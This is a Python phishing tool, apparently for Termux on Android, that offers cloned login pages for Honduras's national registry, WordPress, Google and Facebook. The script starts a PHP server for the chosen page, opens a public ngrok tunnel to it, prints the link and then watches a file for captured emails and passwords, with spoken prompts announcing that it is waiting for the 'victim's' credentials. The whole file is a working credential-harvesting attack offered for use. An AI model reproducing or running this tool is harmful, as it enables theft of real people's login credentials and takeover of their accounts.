#!/bin/python3
# -*- coding: utf-8 -*-

import sys
import time
import os
from gtts import gTTS

#rutas
termux = '/data/data/com.termux'
#php = '/data/data/com.termux/files/usr/lib/php'
#ngrok = '/data/data/com.termux/files/usr/bin/ngrok'

#matar proceso php
os.system('pkill php')
#matar proceso ngrok
os.system('pkill ngrok')

#gtts bienvenida
audio = gTTS('Bienvenido a Pyterm Phish, escoja, una opción, de su preferencia',lang='es-us')
audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/bienvenida.mp3')

#gtts error 
audio = gTTS('Por favor ingrese un valor válido',lang='es-us')
audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/error.mp3')


#Colores de la shell
r='\033[1;31m'
a='\033[1;34m'
am='\033[1;33m'
v='\033[1;32m'
gr='\033[1;30m'
c='\033[1;36m'
b='\033[1;37m'
d='\033[0m'

#Fecha y Hora
hora = time.strftime('%H:%M:%S %p')
fecha = time.strftime('%d/%m/%Y')

#sistema termux
if os.path.exists(termux) == True:
    print (f'{v}Ejecutando en Termux...')
    time.sleep(1)
    print (f'{b}Fecha:{c} ',fecha)
    time.sleep(0.5)
    print (f'{b}Hora:{c} ',hora)
    time.sleep(4)
    os.system('clear')
else:
    print (f'{r}Lo sentimos esta herramienta solo funciona en Termux ):')
    time.sleep(3)
    sys.exit()

#banner
def banner():
    os.system('clear')
    print (f"""{r}\t+-+-+-+-+-+-+
    \t|P|y|t|e|r|m|                             
    \t+-+-+-+-+-+-+""")
    time.sleep(1)
    print (f"""{am}\t+-+-+-+-+-+
    \t|P|h|i|s|h|
    \t+-+-+-+-+-+""")
    time.sleep(1)
    print (f'{gr}   Created by: {c}F@br1x {gr}and {c}你好😜')
    time.sleep(2)
    print ("\n")

#menu de plantillas phishing
banner()
print (f"""\t{gr}1) {c}Registro Nacional Honduras
        {gr}2) {c}Wordpress
        {gr}3) {c}Google
        {gr}4) {c}Facebook
        {gr}5) {c}Salir de PytermPhish""")
os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/bienvenida.mp3')
while True:
    try:
        opcion = int(input(f'{a}[{am}+{a}]{am}Ingrese una opción>> {b}'))
        break
    except ValueError:
        print (f'{r}Favor ingrese un valor válido')
        os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/error.mp3')
        
#opciones
if opcion == 1:
    audio = gTTS('Usted ha elegido,Registro Nacional Honduras',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/rnp.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/rnp.mp3')
    os.system('clear')
    banner()
    audio = gTTS('Iniciando servidor php',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/php.mp3')
    print (f'{v}Iniciando servidor php...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/php.mp3')
    time.sleep(2)
    os.system('php -S localhost:4444 -t /data/data/com.termux/files/home/PytermPhish/sitios/rnh/ > /dev/null &')
    audio = gTTS('Iniciando servidor ngrok',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    print (f'{v}Iniciando servidor ngrok...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    time.sleep(2)
    os.system('ngrok http 4444 > /dev/null &')
    audio = gTTS('Obteniendo Enlaces, espere un momento',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    print (f'{v}Obteniendo Enlaces...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    time.sleep(1)
    print (f'{am}\nEnlace local:')
    print (f'{c}http://localhost:4444/\n')
    audio = gTTS('Su enlace local, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    time.sleep(1)
    print (f'{am}Enlace ngrok:{c}')
    os.system('curl -s localhost:4040/api/tunnels | jq -r .tunnels[1].public_url')
    audio = gTTS('Su enlace de ngrok, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    time.sleep(1)
    audio = gTTS('Esperando Credenciales de la víctima',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    print (f'\n{am}Esperando credenciales...\n{b}')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    archivo = '/data/data/com.termux/files/home/PytermPhish/sitios/rnh/cuentas.txt'
    backup = '/data/data/com.termux/files/home/PytermPhish/sitios/rnh/backups.txt'
    if os.path.isfile(archivo) == True:
        os.system('cat {} >> {}'.format(archivo,backup))
        os.system('rm {}'.format(archivo))
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "email" -e "password"'.format(archivo))
    else:
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "email" -e "password"'.format(archivo))

#Wordpress
elif opcion == 2:
    audio = gTTS('Usted ha elegido,Wordpress',lang='es-us')    
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/wordpress.mp3') 
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/wordpress.mp3')
    os.system('clear')          
    banner()            
    audio = gTTS('Iniciando servidor php',lang='es-us')     
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/php.mp3')
    print (f'{v}Iniciando servidor php...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/php.mp3')
    time.sleep(2)
    os.system('php -S localhost:4444 -t /data/data/com.termux/files/home/PytermPhish/sitios/wp/ > /dev/null &')
    audio = gTTS('Iniciando servidor ngrok',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    print (f'{v}Iniciando servidor ngrok...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    time.sleep(2)
    os.system('ngrok http 4444 > /dev/null &')
    audio = gTTS('Obteniendo Enlaces, espere un momento',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    print (f'{v}Obteniendo Enlaces...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    time.sleep(1)
    print (f'{am}\nEnlace local:')
    print (f'{c}http://localhost:4444/\n')
    audio = gTTS('Su enlace local, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    time.sleep(1)
    print (f'{am}Enlace ngrok:{c}')
    os.system('curl -s localhost:4040/api/tunnels | jq -r .tunnels[1].public_url')
    audio = gTTS('Su enlace de ngrok, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    time.sleep(1)
    audio = gTTS('Esperando Credenciales de la víctima',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    print (f'\n{am}Esperando credenciales...\n{b}')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    archivo = '/data/data/com.termux/files/home/PytermPhish/sitios/wp/cuentas.txt'
    backup = '/data/data/com.termux/files/home/PytermPhish/sitios/wp/backups.txt'
    if os.path.isfile(archivo) == True:
        os.system('cat {} >> {}'.format(archivo,backup))
        os.system('rm {}'.format(archivo))
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "log" -e "pwd"'.format(archivo))
    else:
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "log" -e "pwd"'.format(archivo))

#Amazon Prime video
elif opcion == 3:
    audio = gTTS('Usted ha elegido,Google',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/google.mp3') 
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/google.mp3')
    os.system('clear')                              
    banner()    
    audio = gTTS('Iniciando servidor php',lang='es-us')     
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/php.mp3') 
    print (f'{v}Iniciando servidor php...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/php.mp3')
    time.sleep(2)
    os.system('php -S localhost:4444 -t /data/data/com.termux/files/home/PytermPhish/sitios/pv/ > /dev/null &')
    audio = gTTS('Iniciando servidor ngrok',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    print (f'{v}Iniciando servidor ngrok...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    time.sleep(2)
    os.system('ngrok http 4444 > /dev/null &')
    audio = gTTS('Obteniendo Enlaces, espere un momento',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    print (f'{v}Obteniendo Enlaces...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    time.sleep(1)
    print (f'{am}\nEnlace local:')
    print (f'{c}http://localhost:4444/\n')
    audio = gTTS('Su enlace local, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    time.sleep(1)
    print (f'{am}Enlace ngrok:{c}')
    os.system('curl -s localhost:4040/api/tunnels | jq -r .tunnels[1].public_url')
    audio = gTTS('Su enlace de ngrok, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    time.sleep(1)
    audio = gTTS('Esperando Credenciales de la víctima',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    print (f'\n{am}Esperando credenciales...\n{b}')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    archivo = '/data/data/com.termux/files/home/PytermPhish/sitios/pv/cuentas.txt'
    backup = '/data/data/com.termux/files/home/PytermPhish/sitios/pv/backups.txt'
    if os.path.isfile(archivo) == True:
        os.system('cat {} >> {}'.format(archivo,backup))
        os.system('rm {}'.format(archivo))
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "Email" -e "Passwd"'.format(archivo))
    else:
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "Email" -e "Passwd"'.format(archivo))

#facebook
elif opcion == 4:
    audio = gTTS('Usted ha elegido,Facebook',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/face.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/face.mp3')
    os.system('clear')
    banner()
    audio = gTTS('Iniciando servidor php',lang='es-us')           
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/php.mp3') 
    print (f'{v}Iniciando servidor php...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/php.mp3')   
    time.sleep(2)
    os.system('php -S localhost:4444 -t /data/data/com.termux/files/home/PytermPhish/sitios/face/ > /dev/null &')
    audio = gTTS('Iniciando servidor ngrok',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    print (f'{v}Iniciando servidor ngrok...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/ngrok.mp3')
    time.sleep(2)
    os.system('ngrok http 4444 > /dev/null &')
    audio = gTTS('Obteniendo Enlaces, espere un momento',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    print (f'{v}Obteniendo Enlaces...')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/enlaces.mp3')
    time.sleep(1)
    print (f'{am}\nEnlace local:')
    print (f'{c}http://localhost:4444/\n')
    audio = gTTS('Su enlace local, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/elocal.mp3')
    time.sleep(1)
    print (f'{am}Enlace ngrok:{c}')
    os.system('curl -s localhost:4040/api/tunnels | jq -r .tunnels[1].public_url')
    audio = gTTS('Su enlace de ngrok, yá está listo',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/engrok.mp3')
    time.sleep(1)
    audio = gTTS('Esperando Credenciales de la víctima',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    print (f'\n{am}Esperando credenciales...\n{b}')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/fcr.mp3')
    archivo = '/data/data/com.termux/files/home/PytermPhish/sitios/face/cuentas.txt'
    backup = '/data/data/com.termux/files/home/PytermPhish/sitios/face/backups.txt'
    if os.path.isfile(archivo) == True:
        os.system('cat {} >> {}'.format(archivo,backup))
        os.system('rm {}'.format(archivo))
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "email" -e "pass"'.format(archivo))
    else:
        os.system('touch {}'.format(archivo))
        os.system('tail -f {}|grep -e "email" -e "pass"'.format(archivo))

elif opcion == 5:
    audio = gTTS('Gracias por usar mi herramienta.Creador Fabrix',lang='es-us')
    audio.save('/data/data/com.termux/files/home/PytermPhish/recursos/gracias.mp3')
    print (f'{v}Gracias por usar mi herramienta :){d}')
    os.system('play-audio /data/data/com.termux/files/home/PytermPhish/recursos/gracias.mp3')
    time.sleep(3)
    sys.exit()
else:
    sys.exit()


